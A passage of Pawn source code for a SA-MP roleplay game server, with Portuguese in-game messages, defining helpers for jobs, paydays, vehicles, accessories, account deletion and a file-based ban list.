	    SetPlayerSkin(playerid, hGetInt(GetPlayerXFilePath(playerid), "Skin"));
	    
	    if(ColourType == COLOUR_TYPE_JOB)
	    	SetPlayerColour(playerid, Jobs[jobid][jobColour]);

		SetJobVehiclesParamsForPlayer(TAXI, 		playerid, 	admin || jobid == JOB_CABBIE);
		SetJobVehiclesParamsForPlayer(POLICE_CAR, 	playerid, 	admin || jobid == JOB_POLICE || jobid == JOB_SWAT || jobid == JOB_DELEGATE);
		SetJobVehiclesParamsForPlayer(SCOOTER, 		playerid, 	admin || jobid == JOB_PIZZABOY);
		SetJobVehiclesParamsForPlayer(BUS, 			playerid, 	admin || jobid == JOB_MACHINIST);
		SetJobVehiclesParamsForPlayer(TRAIN, 		playerid, 	admin || jobid == JOB_MACHINIST);
		SetJobVehiclesParamsForPlayer(AMBULANCE, 	playerid, 	admin || jobid == JOB_PARAMEDIC);
		SetJobVehiclesParamsForPlayer(NEWS, 		playerid, 	admin || jobid == JOB_JOURNALIST);
		SetJobVehiclesParamsForPlayer(TOWTRUCK,		playerid, 	admin || jobid == JOB_MECHANIC);
		SetJobVehiclesParamsForPlayer(ROADTRAIN, 	playerid, 	admin || jobid == JOB_TRUCKER);
		SetJobVehiclesParamsForPlayer(FARM,			playerid, 	admin || jobid == JOB_FARMER);
		SetJobVehiclesParamsForPlayer(SMUGGLING,	playerid, 	admin || jobid == JOB_SMUGGLER);
		SetJobVehiclesParamsForPlayer(SECURITY,		playerid, 	admin || jobid == JOB_SECURITY);
		SetJobVehiclesParamsForPlayer(STRETCH,		playerid, 	admin || jobid == JOB_DRIVER);
		SetJobVehiclesParamsForPlayer(PLANE,		playerid, 	admin || jobid == JOB_PILOT);
       	SetJobVehiclesParamsForPlayer(TRASHMASTER, 	playerid, 	admin || jobid == JOB_GARBAGE);
        
        if(!IsPlayerAdmin(playerid))
	    {
        	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && IsServerVehicle(GetPlayerVehicleID(playerid)))
        	{
        	    RemovePlayerFromVehicle(playerid);
        	}
		}
	}
}

stock SendPayday(playerid)
{
	new xpath[128], cpath[128], string[128];
	new jobid, company, post, reward, payday;
	
	xpath = GetPlayerXFilePath(playerid);
	jobid = hGetInt(xpath, "Job");
	GetPlayerCompanyData(playerid, company, post, reward, payday);
	
	if(company == 0)
		payday = Jobs[jobid][jobPayday];
		
	else
	{
	    cpath = GetCompanyFilePath(company);
	    hSetInt(cpath, "Balance", hGetInt(cpath, "Balance") - payday);
	}
	
	hSetInt(xpath, "Bank", hGetInt(xpath, "Bank") + payday);
	format(string, sizeof string, "[ Você recebeu seu salário (Banco +$%d,00 dólares) ]", payday);
	SendPhoneMessage(PlayerName(playerid), "Virtual Society Server", string);
}

stock SendPlayerInvite(playerid, senderid, params, id, title[], info[], button1[], button2[])
{
	if(Invite[playerid] != INVITE_NONE)
	{
	    if(senderid != INVALID_PLAYER_ID)
	    	SendClientMessage(senderid, COLOUR_GRAY, "Este jogador já está com uma proposta em andamento.");
	    	
		return 1;
	}
	
	Invite[playerid] = id;
	InviteSender[playerid] = senderid;
	InviteParams[playerid] = params;
	ShowPlayerDialog(playerid, DIALOG_INVITE, DIALOG_STYLE_MSGBOX, title, info, button1, button2);
	return 0;
}

stock SaveGlobalData()
{
    hSetInt(GLOBAL_FILE_PATH, "CurrentTime", CurrentTime);
	hSetInt(GLOBAL_FILE_PATH, "CurrentDay", CurrentDay);
	hSetInt(GLOBAL_FILE_PATH, "CurrentWeather", CurrentDay);
}

stock LoadGlobalData()
{
	CurrentTime = hGetInt(GLOBAL_FILE_PATH, "CurrentTime");
	CurrentDay = hGetInt(GLOBAL_FILE_PATH, "CurrentDay");
	CurrentWeather = hGetInt(GLOBAL_FILE_PATH, "CurrentWeather");
}

stock IsBallInBasket()
{
	new Float:X, Float:Y, Float:Z;
	
	GetObjectPos(Basketball, X, Y, Z);
	
	if(GetDistance(X, Y, Z, 2290.7009, -1541.0992, 28.8750) < 0.4076025)
	    return 1;
	
	if(GetDistance(X, Y, Z, 2290.5039, -1514.7758, 28.8750) < 0.4076025)
	    return 2;
	    
	return 0;
}

stock SaveVehiclePos(vehicleid, Float:X, Float:Y, Float:Z, Float:A)
{
	new str[128];
	
	format(str, sizeof str, "%.4f,%.4f,%.4f,%.4f", X, Y, Z, A);
	hSetString(GetVehicleFilePath(vehicleid), "Position", str);
}

stock ShowVehicleDocumentsForPlayer(vehicleid, playerid, driverid)
{
	new string[128], owner[128], plate[128], onsale[128];
	new model, fine;

    model = GetVehicleModel(vehicleid);

	if(IsVehicleForSale(vehicleid) || IsRCModel(model))
	{
	    SendClientMessage(playerid, COLOUR_GRAY, "Este veículo não possui documentos.");
	    return;
	}

	if(driverid != INVALID_PLAYER_ID)
	{
    	format(string, sizeof string, "[----- %s - Documentos do Veículo -----]", PlayerName(playerid));
   		SendClientMessage(playerid, COLOUR_GREEN, string);
	}

	else
	    SendClientMessage(playerid, COLOUR_GREEN, "[----- Documentos do Veículo -----]");

    if(IsServerVehicle(vehicleid))
	{
		owner = ("Servidor");
		onsale = ("Não");
		fine = 0;
		format(plate, sizeof plate, "VSR %d", vehicleid + 1000);
	}

	else
	{
  		new vpath[128];
  		new value;

		vpath = GetVehicleFilePath(vehicleid);
		owner = hGetString(vpath, "Owner");
  	  	plate = hGetString(vpath, "NumberPlate");
  	  	value = hGetInt(vpath, "Value");
  	  	fine = hGetInt(vpath, "Fine");

		if(value > 0)
			format(onsale, sizeof onsale, "Sim [Valor: $%d,00 dólares]", value);

		else
		    onsale = ("Não");
  	}

 	format(string, sizeof string, "Modelo: %s - Proprietário: %s - Placa: %s", Vehicles[model - 400][vehModel], owner, plate);
   	SendClientMessage(playerid, COLOUR_WHITE, string);
   	format(string, sizeof string, "Multas avaliadas em: $%d,00 dólares", fine);
   	SendClientMessage(playerid, COLOUR_WHITE, string);
   	format(string, sizeof string, "À Venda: %s", onsale);
   	SendClientMessage(playerid, COLOUR_WHITE, string);
}

stock GetPlateVehicleId(const plate[])
{
	new vpath[128], vplate[128];

	for(new v = 0; v < GetVehicles(); v++)
	{
	    if(IsServerVehicle(v))
	        format(vplate, sizeof vplate, "VSR %d", v + 1000);
	    
	    else
	    {
			vpath = GetVehicleFilePath(v);
			vplate = hGetString(vpath, "NumberPlate");
		}
		
		if(strcmp(vplate, plate, true) == 0)
		    return v;
	}
	
	return INVALID_VEHICLE_ID;
}

stock DeleteAccount(const acc[])
{
	new path[128];
	new data, id, gangid, gangpost;
	
	data = hGetInt(GANGS_FILE_PATH, acc);
	gangid = data >> 5;
	gangpost = data & 0x1F;
	
    fremove(GetPlayerNameXFilePath(acc));
	fremove(GetPlayerNameKFilePath(acc));
	fremove(GetPlayerNameMFilePath(acc));
	hUnset(GANGS_FILE_PATH, acc);
	hUnset(COMPANIES_FILE_PATH, acc);
	hUnset(PHONES_FILE_PATH, acc);
	hUnset(BETS_FILE_PATH, acc);

    if(gangpost == GANG_POST_LEADER)
	    DeleteGang(gangid);
	    
	for(new v = MaxServerVeh; v < GetVehicles(); v++)
	{
 		path = GetVehicleFilePath(v);

		if(strlen(path) > 0 && strcmp(hGetString(path, "Owner"), acc, true) == 0)
  		{
			hSetString(path, "Owner", "Servidor");
			hSetInt(path, "Value", Vehicles[GetVehicleModel(v) - 400][vehValue] + 20000);
		}
	}

	for(new h = 0; h < GetHouses(); h++)
	{
 		path = GetHouseFilePath(h);

		if(strlen(path) > 0 && strcmp(hGetString(path, "Owner"), acc, true) == 0)
		{
  			hSetString(path, "Owner", "Servidor");
			PutHouseOnSale(h, 2);
		}
	}

	id = GetPlayerId(acc);

	if(id != INVALID_PLAYER_ID)
	{
 		new string[128];

		Login[id] = 0;
  		SendClientMessage(id, COLOUR_GRAY, "--> Você foi kickado do servidor por remoção de conta.");
    	Kick(id);
    	format(string, sizeof string, "%s foi kickado do servidor. Motivo: Conta removida", acc);
    	SendClientMessageToAll(COLOUR_RED, string);
	}
	
	Unban(acc);
}

stock Say(playerid, const msg[], Float:radius)
{
	new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;
	
	GetPlayerPos(playerid, X, Y, Z);
	
	for(new n = 0; n < MAX_SLOTS; n++)
	{
		if(IsPlayerConnected(n) && IsPlayerLogged(n))
		{
		    GetPlayerPos(n, PX, PY, PZ);
		    
		    if(GetDistance(X, Y, Z, PX, PY, PZ) < radius)
		        SendPlayerMessageToPlayer(n, playerid, msg);
		}
	}
}

stock Pay(playerid, amount)
{
	new xpath[128], cpath[128], info[128];
	new company, post, reward, payday;
	new Text:tdinfo;
	
	xpath = GetPlayerXFilePath(playerid);
	GetPlayerCompanyData(playerid, company, post, reward, payday);
	
	if(GetPlayerCounter(playerid, COUNTER_LEVEL) <= 0)
	{
	    SetPlayerCounter(playerid, COUNTER_LEVEL, 15);
	    
	    hSetInt(xpath, "Xpoints", hGetInt(xpath, "Xpoints") + 1);
	    format(info, sizeof info, "~y~+XL ~n~");
	    
	    if(hGetInt(xpath, "Xpoints") >= 7)
		{
	    	hSetInt(xpath, "Level", hGetInt(xpath, "Level") + 1);
			hSetInt(xpath, "Xpoints", 0);
			format(info, sizeof info, "%s~y~+Level ~n~", info);
			SendClientMessage(playerid, COLOUR_WHITE, "Você alcançou 7 Xpoints e subiu mais um level.");
		}
		
	    format(info, sizeof info, "~y~+Level ~n~");
	    
    	if(company != 0 && post == COMPANY_POST_EMPLOYEE && reward > 0)
		{
			GivePlayerSysMoney(playerid, reward);
			format(info, sizeof info, "%s~b~+$%d,00 ~n~", info, reward);
		}
	}
	
	if(amount > 0)
	{
		if(company != 0 && post == COMPANY_POST_EMPLOYEE)
		{
    		cpath = GetCompanyFilePath(company);
    		amount = amount / 2;
    		hSetInt(cpath, "Balance", hGetInt(cpath, "Balance") + amount);
		}
	}
	
    GivePlayerSysMoney(playerid, amount);
    format(info, sizeof info, "%s~g~+$%d,00", info, amount);
  
    if(strlen(info) > 0)
    {
		tdinfo = TextDrawCreate(608.0, 103.0, info);
		TextDrawAlignment(tdinfo, 3);
		TextDrawBackgroundColour(tdinfo, 0xFFFFFFFF);
		TextDrawFont(tdinfo, 2);
		TextDrawLetterSize(tdinfo, 0.6, 2.1);
		TextDrawColour(tdinfo, 0xFFFFFFFF);
		TextDrawSetOutline(tdinfo, 0);
		TextDrawSetProportional(tdinfo, 1);
		TextDrawSetShadow(tdinfo, 1);
		TextDrawShowForPlayer(playerid, tdinfo);
    	SetTimerEx("DestroyTextDraw", 6000, false, "dd", _:tdinfo, playerid);
	}
}

stock SetPlayerSysArmour(playerid, Float:armour)
{
	pArmour[playerid] = armour;
	pUpdate[playerid] |= UPDATE_HEALTH;
	SetPlayerArmour(playerid, pArmour[playerid]);
	return 1;
}

stock GetPlayerSysArmour(playerid, &Float:armour)
	armour = pArmour[playerid];

stock SetPlayerSysHealth(playerid, Float:health)
{
    pHealth[playerid] = health;
    pUpdate[playerid] |= UPDATE_HEALTH;
    SetPlayerHealth(playerid, pHealth[playerid]);
	return 1;
}

stock AddPlayerSysHealth(playerid, Float:health)
{
    pHealth[playerid] += health;
    pUpdate[playerid] |= UPDATE_HEALTH;
    SetPlayerHealth(playerid, pHealth[playerid]);
    return 1;
}

stock GetPlayerSysHealth(playerid, &Float:health)
	health = pHealth[playerid];

stock GivePlayerSysMoney(playerid, amount)
{
    pMoney[playerid] += amount;
	pUpdate[playerid] |= UPDATE_MONEY;
	return 1;
}

stock ResetPlayerSysMoney(playerid)
{
    pMoney[playerid] = 0;
    pUpdate[playerid] |= UPDATE_MONEY;
    return 1;
}

stock GetPlayerSysMoney(playerid)
	return pMoney[playerid];

stock IsPlayerCop(playerid)
{
	new jobid;
	jobid = hGetInt(GetPlayerXFilePath(playerid), "Job");
	return (jobid == JOB_POLICE || jobid == JOB_SWAT || jobid == JOB_DELEGATE);
}

stock SavePlayerPos(playerid, Float:X, Float:Y, Float:Z, Float:A)
{
	new str[128];
	format(str, sizeof str, "%.4f,%.4f,%.4f,%.4f", X, Y, Z, A);
	hSetString(GetPlayerXFilePath(playerid), "Position", str);
}

stock LoadPlayerPos(playerid, &Float:X, &Float:Y, &Float:Z, &Float:A)
{
	new str[128], idx = 0;

	str = hGetString(GetPlayerXFilePath(playerid), "Position");
	
	X = floatstr(strtok(str, idx, ','));
	Y = floatstr(strtok(str, idx, ','));
	Z = floatstr(strtok(str, idx, ','));
	A = floatstr(strtok(str, idx, ','));
}

stock UpdatePlayerSpawn(playerid)
{
	new xpath[128];
	new Float:X, Float:Y, Float:Z, Float:A;
	
	xpath = GetPlayerXFilePath(playerid);
	
	if(strlen(hGetString(xpath, "LastPos")) > 0)
	{
		SendClientMessage(playerid, COLOUR_WHITE, "Para continuar na posição onde parou digite \"/continuar\" (15 segundos)");
		ContinueTimer[playerid] = SetTimerEx("ContinueFromLastPos", 15000, false, "d", playerid);
	}
	
	if(GetPlayerCounter(playerid, COUNTER_JOB) > 120)
	    SetPlayerCounter(playerid, COUNTER_JOB, 120);
	    
	if(GetPlayerCounter(playerid, COUNTER_LEVEL) > 15)
	    SetPlayerCounter(playerid, COUNTER_LEVEL, 15);
	
	LoadPlayerPos(playerid, X, Y, Z, A);
	SetSpawnInfo(playerid, 0, hGetInt(xpath, "Skin"), X, Y, Z, A, 0, 0, 0, 0, 0, 0);
}

stock ShowClothes(playerid)
{
	new clothes, cstype;

	cstype = ClothesShop[playerid][csType];

	if(cstype == CLOTHES_NONE)
	    return;

    clothes = GetPlayerSkin(playerid);
    ClothesShop[playerid][csId] = -1;

	for(new n = clothes + 1; n < sizeof Clothes; n++)
 	{
		if(IsValidSkin(n) && Clothes[n][0] == cstype)
		{
			ClothesShop[playerid][csId] = n;
			break;
		}
  	}

	if(ClothesShop[playerid][csId] == -1)
 	{
  		for(new n = 0; n < clothes; n++)
    	{
     		if(IsValidSkin(n) && Clothes[n][0] == cstype)
			{
				ClothesShop[playerid][csId] = n;
				break;
			}
   		}
   	}

    ClothesShop[playerid][csVirtualWorld] = GetPlayerVirtualWorld(playerid);
    ClothesShop[playerid][csOpt] = OPTION_BUY;
    KeyEvent[playerid] |= KEY_EVENT_CLOTHES;
	TogglePlayerControllable(playerid, false);
	SetPlayerSkin(playerid, ClothesShop[playerid][csId]);
	SetPlayerPos(playerid, ClothesShopCameras[cstype][0], ClothesShopCameras[cstype][1], ClothesShopCameras[cstype][2]);
	SetPlayerFacingAngle(playerid, ClothesShopCameras[cstype][3]);
	SetPlayerVirtualWorld(playerid, playerid + 1);
	SetPlayerCameraPos(playerid, ClothesShopCameras[cstype][4], ClothesShopCameras[cstype][5], ClothesShopCameras[cstype][6]);
	SetPlayerCameraLookAt(playerid, ClothesShopCameras[cstype][0], ClothesShopCameras[cstype][1], ClothesShopCameras[cstype][2]);
	TextDrawShowForPlayer(playerid, tdclothes[0]);
}

stock HideClothes(playerid)
{
	KeyEvent[playerid] &= ~KEY_EVENT_CLOTHES;
    TogglePlayerControllable(playerid, true);
	SetPlayerSkin(playerid, hGetInt(GetPlayerXFilePath(playerid), "Skin"));
	SetPlayerVirtualWorld(playerid, ClothesShop[playerid][csVirtualWorld]);
 	SetCameraBehindPlayer(playerid);
 	TextDrawHideForPlayer(playerid, tdclothes[0]);
 	TextDrawHideForPlayer(playerid, tdclothes[1]);
 	ClothesShop[playerid][csVirtualWorld] = 0;
 	ClothesShop[playerid][csId] = -1;
 	ClothesShop[playerid][csType] = CLOTHES_NONE;
}

stock SavePlayerAccessory(playerid, type, accessoryid)
{
	new xpath[128];
	new accessory, mask, seek;

	if(type < 1 || type > 4)
	    return;
	    
	xpath = GetPlayerXFilePath(playerid);
	accessory = hGetInt(xpath, "Accessories");
	seek = (type - 1) * 8;
	mask = ~(0xFF << seek);
	
	hSetInt(xpath, "Accessories", (accessory & mask) | ((accessoryid & 0xFF) << seek));
}

stock GetPlayerAccessory(playerid, type)
{
	if(type < 1 || type > 4)
	    return 0;
	    
	return (hGetInt(GetPlayerXFilePath(playerid), "Accessories") >> ((type - 1) * 8)) & 0xFF;
}

stock GetAccessoryTypeIndex(type)
{
	return 	(type == ACCESSORY_TYPE_HAT) ? OBJECT_SLOT_HAT :
	        (type == ACCESSORY_TYPE_GLASSES) ? OBJECT_SLOT_GLASSES :
			(type == ACCESSORY_TYPE_GUITAR) ? OBJECT_SLOT_GUITAR : -1;
}

stock GetPlayerAccessoryOffset(playerid, accessoryid, Float:off[6])
{
	new skin, type;

#pragma unused skin

	skin = GetPlayerSkin(playerid);
	type = Accessories[accessoryid][accessoryType];
	
	if(type == ACCESSORY_TYPE_HAT)
	{
	    off[0] = 0.1, off[1] = 0.01, off[2] = 0.0, off[3] = 0.0, off[4] = 0.0, off[5] = 0.0;
	}
	
	else if(type == ACCESSORY_TYPE_GLASSES)
	{
	    off[0] = 0.095, off[1] = 0.03, off[2] = 0.0, off[3] = 90.0, off[4] = 90.0, off[5] = 0.0;
	}
	
	else if(type == ACCESSORY_TYPE_GUITAR)
	{
	    off[0] = 0.005, off[1] = -0.11, off[2] = 0.05, off[3] = -10.0, off[4] = 50.0, off[5] = 10.0;
	    
	    if(accessoryid == ACCESSORY_GUITAR_FLYING_V)
			off[1] = -0.09;
	}
	
	else
	{
	    off[0] = 0.0, off[1] = 0.0, off[2] = 0.0, off[3] = 0.0, off[4] = 0.0, off[5] = 0.0;
	    return;
	}
}

stock SetPlayerAccessory(playerid, accessoryid)
{
	new index;
	new Float:off[6];
	
	index = GetAccessoryTypeIndex(Accessories[accessoryid][accessoryType]);
	GetPlayerAccessoryOffset(playerid, accessoryid, off);
	
	if(index > -1)
    	SetPlayerAttachedObject(playerid, index, Accessories[accessoryid][accessoryObject], Accessories[accessoryid][accessoryBone], off[0], off[1], off[2], off[3], off[4], off[5]);
}

stock LoadPlayerAccessories(playerid)
{
	new accessory;
	
	accessory = hGetInt(GetPlayerXFilePath(playerid), "Accessories");
	
	for(new t = 0; t < 3; t++)
	{
		if(accessory & 0xFF > 0)
	    	SetPlayerAccessory(playerid, accessory & 0xFF);
	    	
	    accessory >>= 8;
	}
}

stock RemovePlayerAccessory(playerid, type)
{
	new index;
	
	index = GetAccessoryTypeIndex(type);
	
	if(index > -1 && IsPlayerAttachedObjectSlotUsed(playerid, index))
		RemovePlayerAttachedObject(playerid, index);
}

stock DeletePlayerAccessory(playerid, type)
{
	RemovePlayerAccessory(playerid, type);
	SavePlayerAccessory(playerid, type, 0);
}

stock IncreasePlayerCounter(playerid)
{
	new xpath[128], kpath[128];
	new day, month, year, value;
	
	xpath = GetPlayerXFilePath(playerid);
	kpath = GetPlayerKFilePath(playerid);
	getdate(year, month, day);
	    
	for(new c = 0; c < sizeof Counters; c++)
	{
	    value = hGetInt(kpath, Counters[c][cntKey]);
	    
	    switch(Counters[c][cntType])
	    {
	        case INCREASER_COUNTER:
	        {
	            if(c == COUNTER_HOTEL)
	    		{
			        if(hGetInt(xpath, "Hotel") != 1)
				        continue;
				}
				
	            if((++value) >= Counters[c][cntLimit] && Counters[c][cntLimit] != UNLIMITED)
      			{
       		    	value = 0;
   		       		
   		       		if(c == COUNTER_HOTEL)
   		       		{
   		       		    hSetInt(xpath, "Bank", hGetInt(xpath, "Bank") - 30);
						SendPhoneMessage(PlayerName(playerid), "Virtual Hotel", "[ Diaria descontada de sua conta bancaria. Valor: $30,00 dólares ]");
   		       		}
   		       		
					if(c == COUNTER_PAY)
					    SendPayday(playerid);
				}
			}
	        
	        case DECREASER_COUNTER:
	        {
	            if(value == Counters[c][cntLimit])
	                continue;
	                
	            if((--value) < Counters[c][cntLimit])
	            {
	                value = Counters[c][cntLimit];
	                
	                if(c == COUNTER_DRUG)
	                    SetPlayerWeather(playerid, Weathers[CurrentWeather][wWeatherId]);
				}
	        }
	    }
	    
	    hSetInt(kpath, Counters[c][cntKey], value);
	}
	
	hSetInt(kpath, "Last", ((year & 0xFFFF) << 16) | ((month & 0xFF) << 8) | (day & 0xFF));
}

stock IsPlayerModerator(playerid)
{
	if(!IsPlayerConnected(playerid) || !IsPlayerLogged(playerid))
	    return -1;
	    
	return (hGetInt(GetPlayerXFilePath(playerid), "Moderator") == 1);
}

stock BanCmd(const cmdtext[])
{

}

stock BanAcc(playerid, const reason[])
{
	new File:fp;
	new date[6], name[MAX_PLAYER_NAME], IP[128], wtext[256];
	
	GetPlayerIp(playerid, IP, sizeof IP);
	GetPlayerName(playerid, name, sizeof name);

	fp = fopen(BAN_FILE_PATH, io_append);
	gettime(date[0], date[1], date[2]);
	getdate(date[5], date[4], date[3]);

	format(wtext, sizeof wtext, "[%s %s] // %s (%s - %s)\r\n", name, IP, reason, ToDate(date[3], date[4], date[5]), ToTime(date[0], date[1], date[2]));
	fwrite(fp, wtext);
	fclose(fp);
	reportf("%s - Banido (%s)", REPORT_ACTION, PlayerName(playerid), reason);
	Kick(playerid);
}

stock Unban(const playername[])
{
	if(!fexist(BAN_FILE_PATH))
		return false;
	
	new File:fp, File:buf;
	new tmp[256];
	
	fp = fopen(BAN_FILE_PATH, io_read);
	buf = fopen(BAN_BUFFER_FILE_PATH, io_write);
	
	while(fread(fp, tmp, sizeof tmp))
	{
	    new read[128], uname[128], idx = 0;
	    
	    strmid(read, tmp, strfind(tmp, "[", true) + 1, strfind(tmp, "]", true));
	    uname = strtok(read, idx);
	    
		if(strcmp(uname, playername, true))
		    fwrite(buf, tmp);
	}
	
	fclose(buf);
	fclose(fp);
	
	if(fcopytextfile(BAN_BUFFER_FILE_PATH, BAN_FILE_PATH))
		return fremove(BAN_BUFFER_FILE_PATH);
		
	return false;
}

stock CheckBan(const playername[], const ip[])
{
	if(!fexist(BAN_FILE_PATH))
		return 1;

	new File:fp;
	new tmp[256];

	fp = fopen(BAN_FILE_PATH, io_read);
	    
	while(fread(fp, tmp, sizeof tmp))
	{
	    new read[128], uname[128], uIP[128];
	    new idx = 0;
	    
	    strmid(read, tmp, strfind(tmp, "[", true) + 1, strfind(tmp, "]", true));
	    uname = strtok(read, idx);
	    uIP = strtok(read, idx);
	    
	    if(	(strlen(playername) > 0 && strcmp(uname, playername, true) == 0) ||
			(strlen(ip) > 0 && strcmp(uIP, ip, true) == 0))
	    {
	        fclose(fp);
	        return 0;
	    }
	}
	
	fclose(fp);
	return 1;
}

stock AddStaticServerVehicle(modelid, Float:X, Float:Y, Float:Z, Float:ang, colour1, colour2, respawn_delay, virtual_world = 0)
{
	new vkey[128], plate[128];
	new id, vexist;
	
	id = AddStaticVehicleEx(modelid, X, Y, Z, ang, colour1, colour2, respawn_delay);
	
	if(virtual_world != 0)
	    SetVehicleVirtualWorld(id, virtual_world);
	
	format(vkey, sizeof vkey, "Veh%d", id);
	format(plate, sizeof plate, "VSR %d", id + 1000);
	vexist = hGetInt(SERVER_VEHICLES_FILE_PATH, vkey) & 0x1;
	
	if(vexist == 0)
		hSetInt(SERVER_VEHICLES_FILE_PATH, vkey, (100 << 1) | 1);

	SetVehicleNumberPlate(id, plate);
	return id;
}

stock CreatePlayerVehicle(const owner[], modelid, Float:X, Float:Y, Float:Z, Float:ang, colour1, colour2)
{
	new vpath[128], plate[128];
	new veh, sysid;
	
	sysid = -1;
	for(new v = 0; v < sizeof VehicleId; v++)
	{
		vpath = GetSysVehicleFilePath(v);
		
		if(!fexist(vpath) || hGetInt(vpath, "Deleted") == 1)
		{
		    sysid = v;
		    break;
		}
	}
	
	if(sysid == -1)
	    return -1;
	
	veh = CreateVehicle(modelid, X, Y, Z, ang, colour1, colour2, -1);
	vpath = GetSysVehicleFilePath(sysid);
	VehicleId[sysid] = veh;

	format(plate, sizeof plate, "VSR %d", sysid + 2000);
	SetVehicleNumberPlate(veh, plate);
	
	hUnset(vpath, "Deleted");
	hSetString(vpath, "Owner", owner);
	hSetString(vpath, "NumberPlate", plate);
	hSetInt(vpath, "Model", modelid);
	hSetInt(vpath, "Fuel", 100);
	hSetInt(vpath, "Value", 0);
	hSetInt(vpath, "Fine", 0);
	hSetInt(vpath, "Seized", 0);
	hSetInt(vpath, "Airbag", 0);
	hSetInt(vpath, "Tun0", 0xFFFFFFFF);
	hSetInt(vpath, "Tun1", 0xFFFFFFFF);
	hSetInt(vpath, "Tun2", 0xFFFFFFFF);
	hSetInt(vpath, "Tun3", 0xFFFFFFFF);
	hSetInt(vpath, "Tun4", 0xFFFFFFFF);
	hSetInt(vpath, "Colours", ((colour1 & 0xFFFF) << 16) | (colour2 & 0xFFFF));
	hSetInt(vpath, "Params", 0);
    SaveVehiclePos(veh, X, Y, Z, ang);
 
    if(veh > MaxServerVeh + MaxPlayerVeh)
        MaxPlayerVeh = veh - MaxServerVeh;
	
	return veh;
}

stock DestroyPlayerVehicle(vehicleid)
{
    if(IsServerVehicle(vehicleid) || IsVehicleForSale(vehicleid))
	    return;
	    
	for(new v = 0; v < sizeof VehicleId; v++)
	{
	    if(VehicleId[v] == vehicleid)
	    {
	        VehicleId[v] = -1;
	        break;
	    }
	}
	
	DestroyVehicle(vehicleid);
}

stock DeletePlayerVehicle(vehicleid)
{
	if(IsServerVehicle(vehicleid) || IsVehicleForSale(vehicleid))
	    return;
	    
	new vpath[128];
	
	vpath = GetVehicleFilePath(vehicleid);
	hSetInt(vpath, "Deleted", 1);
	DestroyVehicle(vehicleid);
}

stock GetNextPlayer(playerid, Float:radius)
{
    if(IsPlayerInAnyVehicle(playerid))
	    return GetPlayerVehicleID(playerid);

	new id;
	new Float:PX, Float:PY, Float:PZ, Float:X, Float:Y, Float:Z, Float:dis;

	GetPlayerPos(playerid, PX, PY, PZ);

	id = INVALID_PLAYER_ID;
	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n) && n != playerid)
	    {
			new Float:pdis;

		    GetPlayerPos(n, X, Y, Z);
			pdis = GetDistance(PX, PY, PZ, X, Y, Z);

			if(pdis < radius && (id == INVALID_PLAYER_ID || pdis < dis))
			{
			    id = n;
			    dis = pdis;
			}
		}
	}

	return id;
}

stock GetNextVehicle(playerid, Float:radius)
{
	if(IsPlayerInAnyVehicle(playerid))
	    return GetPlayerVehicleID(playerid);
	    
	new id;
	new Float:PX, Float:PY, Float:PZ, Float:VX, Float:VY, Float:VZ, Float:dis;

	GetPlayerPos(playerid, PX, PY, PZ);

	id = INVALID_VEHICLE_ID;
	for(new v = 0; v < GetVehicles(); v++)
	{
		new Float:pdis;

	    GetVehiclePos(v, VX, VY, VZ);
		pdis = GetDistance(PX, PY, PZ, VX, VY, VZ);

		if(pdis < radius && (id == INVALID_VEHICLE_ID || pdis < dis))
		{
		    id = v;
		    dis = pdis;
		}
	}

	return id;
}

stock GetNextPlayerVehicle(playerid, Float:radius)
{
	if(IsPlayerInAnyVehicle(playerid))
	    return GetPlayerVehicleID(playerid);

	new id;
	new Float:PX, Float:PY, Float:PZ, Float:VX, Float:VY, Float:VZ, Float:dis;

	GetPlayerPos(playerid, PX, PY, PZ);

	id = INVALID_VEHICLE_ID;
	for(new v = MaxServerVeh; v < GetVehicles(); v++)
	{
		new Float:pdis;

	    GetVehiclePos(v, VX, VY, VZ);
		pdis = GetDistance(PX, PY, PZ, VX, VY, VZ);

		if(pdis < radius && (id == INVALID_VEHICLE_ID || pdis < dis))
		{
		    id = v;
		    dis = pdis;
		}
	}

	return id;
}

stock FuncGetNextMatrixObject(playerid, matrix[], Float:radius, maxlength)
{
	new id;
	new Float:PX, Float:PY, Float:PZ, Float:OX, Float:OY, Float:OZ, Float:dis;
	
	GetPlayerPos(playerid, PX, PY, PZ);
	
	id = -1;
	for(new o = 0; o < maxlength; o++)
	{
		new Float:pdis;
		
		GetObjectPos(matrix[o], OX, OY, OZ);
		pdis = GetDistance(PX, PY, PZ, OX, OY, OZ);
		
		if(pdis < radius && (id == -1 || pdis < dis))
		{
		    id = o;
		    dis = pdis;
		}
	}
	
	return id;
}

stock SetVehicleFuel(vehicleid, amount)
{
	if(IsVehicleForSale(vehicleid))
	    return;
	    
	if(IsServerVehicle(vehicleid))
	{
	    new vkey[128];
	    format(vkey, sizeof vkey, "Veh%d", vehicleid);
  		hSetInt(SERVER_VEHICLES_FILE_PATH, vkey, ((amount & 0x7F) << 1) | 1);
	}

	else
	    hSetInt(GetVehicleFilePath(vehicleid), "Fuel", amount);
	    
	for(new n = 0; n < MAX_SLOTS; n++)
	{
		if(IsPlayerConnected(n) && IsPlayerLogged(n) && GetPlayerState(n) == PLAYER_STATE_DRIVER && IsPlayerInVehicle(n, vehicleid))
		{
		    UpdatePlayerFuelText(n);
		    if(VFrozenFlags[n] & VFROZEN_NO_GAS && amount > 0)
		    {
		        VFrozenFlags[n] &= ~VFROZEN_NO_GAS;
		        
		        if(VFrozenFlags[n] == 0)
		        {
		            TogglePlayerControllable(n, true);
		            TextDrawHideForPlayer(n, tdvehicle);
		        }
		    }
		}
	}
}

stock GetVehicleFuel(vehicleid)
{
	if(IsVehicleForSale(vehicleid))
	    return 100;
	    
    if(IsServerVehicle(vehicleid))
	{
	    new vkey[128];
		new fuel;
		
		format(vkey, sizeof vkey, "Veh%d", vehicleid);
		fuel = (hGetInt(SERVER_VEHICLES_FILE_PATH, vkey) >> 1) & 0x7F;
		
  		return fuel;
	}

	else
	    return hGetInt(GetVehicleFilePath(vehicleid), "Fuel");
}

stock SetVehicleColours(vehicleid, colour1, colour2)
{
	if(IsServerVehicle(vehicleid) || IsVehicleForSale(vehicleid))
	    return;
    
	hSetInt(GetVehicleFilePath(vehicleid), "Colours", ((colour1 & 0xFFFF) << 16) | (colour2 & 0xFFFF));
}

stock SetVehicleColoursEx(vehicleid, value)
{
	if(IsServerVehicle(vehicleid) || IsVehicleForSale(vehicleid))
	    return;
	    
 	hSetInt(GetVehicleFilePath(vehicleid), "Colours", value);
}

